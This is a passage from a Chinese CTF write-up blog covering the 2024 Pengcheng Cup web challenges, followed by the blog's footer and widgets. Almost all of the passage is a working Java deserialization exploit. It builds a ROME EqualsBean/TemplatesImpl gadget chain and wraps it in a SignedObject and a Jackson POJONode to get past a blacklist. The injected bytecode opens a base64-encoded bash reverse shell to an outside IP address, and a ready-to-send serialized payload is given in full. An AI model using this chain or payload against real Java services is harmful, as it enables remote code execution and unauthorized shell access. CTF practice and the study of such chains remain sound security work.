&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是可以看到这个<code>黑名单</code>并没有过滤<code>SignedObject</code>和<code>jackson</code>啊，很明显可以通过二次反序列化直接绕过过滤。</p>
<p>仔细看<code>pom.xml</code>，题目还提供了<code>rome 1.0</code>，因此思路就可以是<code>SignedObject</code>配合<code>Jackson</code>打二次反序列化触发<code>rome</code>了，exp如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.romedemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">pcbexp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> getTemplatesImpl();</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(String.class, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(<span class="string">&quot;yy&quot;</span>, equalsBean);</span><br><span class="line">        map1.put(<span class="string">&quot;zZ&quot;</span>, templates);</span><br><span class="line">        map2.put(<span class="string">&quot;zZ&quot;</span>, equalsBean);</span><br><span class="line">        map2.put(<span class="string">&quot;yy&quot;</span>, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(map1, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        hashMap.put(map2, <span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        SetValue(equalsBean, <span class="string">&quot;_beanClass&quot;</span>, Templates.class);</span><br><span class="line">        SetValue(equalsBean, <span class="string">&quot;_obj&quot;</span>, templates);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成SignedObject</span></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">keyPairGenerator</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(hashMap, keyPair.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 删除BaseJsonNode的writeReplace类</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">node</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">wr</span> <span class="operator">=</span> node.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">        node.removeMethod(wr);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        node.toClass(classLoader, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(signedObject);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        SetValue(badAttributeValueExpException, <span class="string">&quot;val&quot;</span>, pojoNode);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">ser</span> <span class="operator">=</span> Serialize(badAttributeValueExpException);</span><br><span class="line">        System.out.println(ser);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Unserialize(&quot;rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAPHQAG2NvbS5leGFtcGxlLnJvbWVkZW1vLnBjYmV4cHQAC3BjYmV4cC5qYXZhdAAEbWFpbnNyACZqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlTGlzdPwPJTG17I4QAgABTAAEbGlzdHEAfgAHeHIALGphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVDb2xsZWN0aW9uGUIAgMte9x4CAAFMAAFjdAAWTGphdmEvdXRpbC9Db2xsZWN0aW9uO3hwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAB3BAAAAAB4cQB+ABV4c3IALGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlBPSk9Ob2RlAAAAAAAAAAICAAFMAAZfdmFsdWVxAH4AAXhyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc3IAGmphdmEuc2VjdXJpdHkuU2lnbmVkT2JqZWN0Cf+9aCo81f8CAANbAAdjb250ZW50dAACW0JbAAlzaWduYXR1cmVxAH4AG0wADHRoZWFsZ29yaXRobXEAfgAFeHB1cgACW0Ks8xf4BghU4AIAAHhwAAAD1KztAAVzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAMdwgAAAAQAAAAAnNxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAnQAAnl5c3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLkVxdWFsc0JlYW71ihi75fYYEQIAAkwACl9iZWFuQ2xhc3N0ABFMamF2YS9sYW5nL0NsYXNzO0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHBzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAXVyAAJbQqzzF/gGCFTgAgAAeHAAAAFWyv66vgAAADQAGAEAAWEHAAEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwADAQAGPGluaXQ+AQADKClWAQAEQ29kZQwABQAGCgAEAAgBABFqYXZhL2xhbmcvUnVudGltZQcACgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAwADQoACwAOAQAEY2FsYwgAEAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABIAEwoACwAUAQAKU291cmNlRmlsZQEABmEuamF2YQAhAAIABAAAAAAAAQABAAUABgABAAcAAAAaAAIAAQAAAA4qtwAJuAAPEhG2ABVXsQAAAAAAAQAWAAAAAgAXcHQAA2FhYXB3AQB4dAACelpxAH4AD3h0AAExc3EAfgAAP0AAAAAAAAx3CAAAABAAAAACcQB+ABVxAH4AB3EAfgADcQB+AA94cQB+ABZ4dXEAfgAdAAAALjAsAhQq+kMQpBLgSbD3Y7VsFZujCJRKJAIUJpEbqrpamAouD6ZvxcL62OGzx4h0AANEU0E=&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">SetValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] GenerateEvil() <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        ctClass.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ctClass);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzOC4xMjcuNzQvMjMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>);</span><br><span class="line">        ctClass.addConstructor(constructor);</span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">getTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;GenerateEvil()&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        SetValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        SetValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        SetValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">Serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">encode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        encode.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Unserialize</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(s)));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAPHQAG2NvbS5leGFtcGxlLnJvbWVkZW1vLnBjYmV4cHQAC3BjYmV4cC5qYXZhdAAEbWFpbnNyACZqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlTGlzdPwPJTG17I4QAgABTAAEbGlzdHEAfgAHeHIALGphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVDb2xsZWN0aW9uGUIAgMte9x4CAAFMAAFjdAAWTGphdmEvdXRpbC9Db2xsZWN0aW9uO3hwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAB3BAAAAAB4cQB+ABV4c3IALGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlBPSk9Ob2RlAAAAAAAAAAICAAFMAAZfdmFsdWVxAH4AAXhyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc3IAGmphdmEuc2VjdXJpdHkuU2lnbmVkT2JqZWN0Cf+9aCo81f8CAANbAAdjb250ZW50dAACW0JbAAlzaWduYXR1cmVxAH4AG0wADHRoZWFsZ29yaXRobXEAfgAFeHB1cgACW0Ks8xf4BghU4AIAAHhwAAAELaztAAVzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAMdwgAAAAQAAAAAnNxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAnQAAnl5c3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLkVxdWFsc0JlYW71ihi75fYYEQIAAkwACl9iZWFuQ2xhc3N0ABFMamF2YS9sYW5nL0NsYXNzO0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHBzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAXVyAAJbQqzzF/gGCFTgAgAAeHAAAAGvyv66vgAAADQAGAEAAWEHAAEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwADAQAGPGluaXQ+AQADKClWAQAEQ29kZQwABQAGCgAEAAgBABFqYXZhL2xhbmcvUnVudGltZQcACgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAwADQoACwAOAQBdYmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzg0TGpFek9DNHhNamN1TnpRdk1qTXpNeUF3UGlZeH18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9CAAQAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAEgATCgALABQBAApTb3VyY2VGaWxlAQAGYS5qYXZhACEAAgAEAAAAAAABAAEABQAGAAEABwAAABoAAgABAAAADiq3AAm4AA8SEbYAFVexAAAAAAABABYAAAACABdwdAADYWFhcHcBAHh0AAJ6WnEAfgAPeHQAATFzcQB+AAA/QAAAAAAADHcIAAAAEAAAAAJxAH4AFXEAfgAHcQB+AANxAH4AD3hxAH4AFnh1cQB+AB0AAAAuMCwCFHljoG3/4cGiTq4dKhyep69MBtl8AhRfKelvqGBUtkddritkGkdNvdC08nQAA0RTQQ==</span><br></pre></td></tr></table></figure>
<p>直接将payload打过去即可</p>
<img src="/posts/10200/11.png" class title="awa">
</div>
        </div>
        
            <div class="kratos-copyright text-center clearfix">
                <h5 itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
            </div>
        
        <footer class="kratos-entry-footer clearfix">
            
                <div class="post-like-donate text-center clearfix" id="post-like-donate">
                
                    <a class="donate" href="javascript:;"><i class="fa fa-bitcoin"></i> 打赏</a>
                
                
                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
                    <div class="share-wrap" style="display: none;">
    <div class="share-group">
        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-qq"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-star"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-weixin"></i>
            </div>
            <div class="share-int">
                <div class="qrcode" id="wechat-qr"></div>
                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
            </div>
        </a>
        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-weibo"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-facebook"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-twitter"></i>
            </div>
        </a>
    </div>
    <script type="text/javascript">
        $(()=>{
            new QRCode("wechat-qr", {
                text: "http://example.com/posts/10200.html",
                width: 150,
                height: 150,
                correctLevel : QRCode.CorrectLevel.H
            });
        });
        function share(dest) {
            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
            const weiboBase     = "https://service.weibo.com/share/share.php?";
            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
            const twitterBase   = "https://twitter.com/intent/tweet?";
            const hostUrl       = "http://example.com/posts/10200.html";
            const title         = "「2024鹏城杯线上赛Web方向题解」";
            const excerpt       = `web美美下班，强度很适合我`;
            let _URL;
            switch (dest) {
                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
            }
            window.open(_URL);
        };
    </script>
</div>
                
                </div>
            
            <div class="footer-tag clearfix">
                <div class="pull-left">
                <i class="fa fa-tags"></i>
                    <a class="tag-none-link" href="/tags/Web/" rel="tag">Web</a>
                </div>
                <div class="pull-date">
                    <time datetime="2024-11-09T16:35:40.467Z" itemprop="dateModified">最后编辑：2024-11-10</time>
                </div>
            </div>
        </footer>
    </div>
    
        <nav class="navigation post-navigation clearfix" role="navigation">
            
            <div class="nav-previous clearfix">
                <a title=" dasctf十月web方向部分题解" href="/posts/49264.html">&lt; 上一篇</a>
            </div>
            
            
        </nav>
    
    
        <div id="v-comments" class="post-comments bg-image"></div>
<script>
    var load_comm = () => {
        const init = () => {
            new Valine({
                el: '#v-comments',
                appId: 'bNjjbBH5XN8401rWT4xZhbCF-gzGzoHsz',
                appKey: 'R4c5rtiMieN1Kb3frShXDfw8',
                visitor: true,
                enableQQ: false,
                path: '/posts/10200.html'
                
            });
        }
        if (typeof Valine === 'undefined') {
            const src = '/vendors/valine@1.4.18/dist/Valine.min.js';
            $.getScript(src, init);
        } else {
            init();
        }
    };
</script>


<script>
<style>
    .v .veditor{min-height: 10rem;
        background-image: url(https://cdn.jsdelivr.net/gh/cungudafa/img/images/girls2.png);
        background-size: contain;
        background-repeat: no-repeat;
        background-position: right;
        background-color: rgba(255,255,255,0);
        resize: none;}
</style>
</script>


    <script>
        new Valine({
            el: '#vcomments',
            lang: 'zh-cn',
            admin_email: '83635877@qq.com',//博主邮箱
            appId: "",
            appKey: "",
            path: window.location.pathname,
            comment_count: true,
            //notify: false, // 邮件提醒!使用第三方就不要添加这个!!
            //verify: true, //验证码
            avatar: 'monsterid',//小怪物头像
            placeholder: "qwq~"
        });
        
</script>
    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
    <script type="text/javascript">
        jinrishici.load(function(result) {
            var jrsc_plac =  result.data.content + "\n「" + result.data.origin.title + "」" + result.data.origin.dynasty + " · " + result.data.origin.author;
            document.getElementById("veditor").setAttribute("placeholder",jrsc_plac);
        })
    </script>

<noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://valine.js.org/">comments powered by Valine.</a></noscript>

    
</article>

        

            </section>

        

        <script src="./js/src/Valine.min.js"></script>   
        
        
            

<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
    
    
                <aside id="krw-about" class="widget widget-kratos-about clearfix">
    <div class="photo-background"></div>
    <div class="photo-wrapper clearfix">
        <div class="photo-wrapper-tip text-center">
            <img class="about-photo" src="/images/touxiang.png" loading="lazy" decoding="auto" />
        </div>
    </div>
    <div class="textwidget">
        <p class="text-center"></p>
    </div>
    <div class="site-meta">
        <a class="meta-item" href="/archives/">
            <span class="title">
                文章
            </span>
            <span class="count">
                81
            </span>
        </a>
        <a class="meta-item" href="/categories/">
            <span class="title">
                分类
            </span>
            <span class="count">
                12
            </span>
        </a>
